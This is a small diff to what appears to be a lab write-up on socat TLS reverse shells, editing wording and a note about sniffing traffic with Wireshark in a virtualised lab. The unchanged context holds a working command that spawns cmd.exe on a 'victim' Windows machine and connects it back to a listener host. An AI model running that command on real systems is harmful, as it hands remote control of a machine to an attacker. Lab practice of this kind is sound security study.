@@ -85,11 +85,10 @@ On the Win victim machine lunch the socat TLS reverse shell as follows:
 ```
 socat OPENSSL:192.168.1.7:443,verify=0 EXEC:'cmd.exe',pipes
 ```
-We can follow the stream usign Wireshark
+We can follow the hand shake usign Wireshark:
 
-  
+
 ---
 **NOTE**
 ###### If your Lab (as mine) is created using a virtualizer (e.g. Virtualbox) remember that you can not itercept any traffics with a bridged mode network configuration on the host machine, since it bypass the host OS network stack entirely. Here I'm running Wireshark on the guest Parrot OS redirector
-
 ---
